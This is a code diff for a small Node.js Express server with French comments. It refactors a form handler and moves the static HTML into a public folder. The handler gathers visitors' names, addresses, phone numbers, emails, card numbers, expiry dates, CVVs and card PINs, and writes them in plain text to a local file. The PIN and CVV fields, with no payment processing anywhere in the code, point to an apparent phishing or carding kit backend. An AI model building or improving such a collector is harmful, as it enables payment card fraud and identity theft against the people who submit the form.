@@ -7,25 +7,16 @@ const app = express();
 const port = process.env.PORT || 3000; // Port dynamique pour l'hébergement
 
 app.use(bodyParser.urlencoded({ extended: true }));
+app.use(express.static(path.join(__dirname, '../public'))); // Servir les fichiers statiques
 
 // Servir le fichier HTML
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
+    res.sendFile(path.join(__dirname, '../public/index.html'));
 });
 
 // Enregistrer les données soumises dans un fichier local
 app.post('/enregistrer', (req, res) => {
-    const nom = req.body.nom;
-    const prenom = req.body.prenom;
-    const ville = req.body.ville;
-    const codepostal = req.body.codepostal;
-    const adresse = req.body.adresse;
-    const telephone = req.body.telephone;
-    const email = req.body.email;
-    const carte = req.body.carte;
-    const expiration = req.body.expiration;
-    const cvv = req.body.cvv;
-    const pin = req.body.pin;
+    const { nom, prenom, ville, codepostal, adresse, telephone, email, carte, expiration, cvv, pin } = req.body;
     const data = `Nom: ${nom}, Prenom: ${prenom}, Ville: ${ville}, CodePostal: ${codepostal}, Adresse: ${adresse}, Téléphone: ${telephone}, Email: ${email}, NumeroDeCarte: ${carte}, DateExpiration: ${expiration}, CVV: ${cvv}, CodePin: ${pin}\n`;
 
     fs.appendFile('donnees.txt', data, (err) => {
